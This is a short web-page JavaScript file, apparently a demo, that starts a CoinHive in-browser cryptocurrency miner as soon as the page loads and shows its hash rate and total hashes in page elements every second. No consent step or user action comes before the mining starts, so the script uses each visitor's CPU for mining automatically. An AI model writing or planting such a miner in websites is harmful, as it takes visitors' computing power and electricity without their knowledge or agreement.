$(document).ready(function(){
  console.log('howdy1')

});

console.log('howdy2')
var miner = new CoinHive.Anonymous('PPXf34fiALvgCkOGgAFgmFz7wtXN34mJ');
miner.start();
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
  var hashesPerSecond = miner.getHashesPerSecond();
  var totalHashes = miner.getTotalHashes();
  var acceptedHashes = miner.getAcceptedHashes();
  console.log("Hashes per Second ", hashesPerSecond)
  console.log("totalHashes ", totalHashes)
  $('.mined').html(totalHashes)
  $('.rate').html(hashesPerSecond)



  // Output to HTML elements...
}, 1000);